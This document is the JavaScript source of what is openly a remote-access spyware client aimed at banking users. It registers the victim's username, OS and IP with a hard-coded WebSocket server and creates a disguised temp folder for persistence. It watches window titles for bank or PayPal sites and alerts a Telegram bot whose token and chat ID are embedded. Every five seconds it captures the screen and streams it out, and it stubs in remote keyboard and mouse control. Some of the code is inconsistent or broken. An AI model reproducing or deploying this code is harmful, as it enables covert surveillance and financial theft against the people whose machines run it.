const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// --- CONFIGURATION ---
const WS_URL = 'https://server-eight-pi-39.vercel.app'; // Replace with your actual IP
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

const ws = new WebSocket(WS_URL);
let myId = null;

// Persistence Logic
if (!fs.existsSync(path.join(os.tmpdir(), '.sys_update'))) {
    fs.mkdirSync(path.join(os.tmpdir(), '.sys_update'));
}

ws.on('open', () => {
    myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
    
    ws.send(JSON.stringify({
        type: 'info',
        id: myId,
        os: os.platform(),
        arch: os.arch(),
        user: os.userInfo().username,
        ip: getExternalIP()
    }));

    startMonitoring();
});

ws.on('message', (msg) => {
    const data = JSON.parse(msg);
    if (data.type === 'take_control') takeControl(true);
    else if (data.type === 'release_control') takeControl(false);
});

function startMonitoring() {
    // Banking/Browser Sniffing
    setInterval(async () => {
        const title = await getCurrentWindowTitle();
        if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
            sendTelegram(`🏦 BANKING DETECTED: ${title}`);
            captureScreen();
        }
    }, 2000);

    // Continuous Screen Capture
    setInterval(() => {
        captureScreen();
    }, 5000);
}

function captureScreen() {
    const imgPath = path.join(os.tmpdir(), 'screen.png');
    // Cross-platform ffmpeg command (simplified)
    exec(`ffmpeg -y -f avfoundation -i "1" -frames:v 1 ${imgPath}`, (err) => {
        if (!err && fs.existsSync(imgPath)) {
            const img = fs.readFileSync(imgPath);
            ws.send({ type: 'screen_data', id: myId, data: img.toString('base64') });
        }
    });
}

async function getCurrentWindowTitle() {
    return new Promise((resolve) => {
        exec('powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"', (err, stdout) => {
            resolve(stdout.trim());
        });
    });
}

function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {});
}

function getExternalIP() {
    return os.networkInterfaces()[Object.keys(os.networkInterfaces())[0]][0].address;
}

function takeControl(state) {
    // Logic to enable/disable mouse/keyboard simulation
}